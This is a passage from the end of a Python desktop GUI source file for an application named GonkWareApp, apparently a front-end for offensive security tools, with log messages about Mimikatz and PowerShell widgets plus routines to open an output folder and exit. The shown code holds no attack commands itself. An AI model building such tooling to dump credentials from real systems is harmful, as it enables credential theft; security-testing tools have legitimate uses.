                    logger.error("PowerShell widget not found")
            else:
                logger.error("Mimikatz widgets not initialized")
        except Exception as e:
            logger.error(f"Error in debug: {e}")

    # Open the output folder in the system file explorer
    def open_output_folder(self):
        output_path = os.path.abspath("output")
        if os.name == 'posix':  # Linux/Mac
            try:
                subprocess.Popen(['xdg-open', output_path])
            except Exception:
                os.system(f'xdg-open "{output_path}"')  # fallback

    # Exit the application
    def on_exit(self):
        self.root.destroy()

# Run the application
if __name__ == "__main__":
    root = tb.Window()
    app = GonkWareApp(root)
    root.mainloop()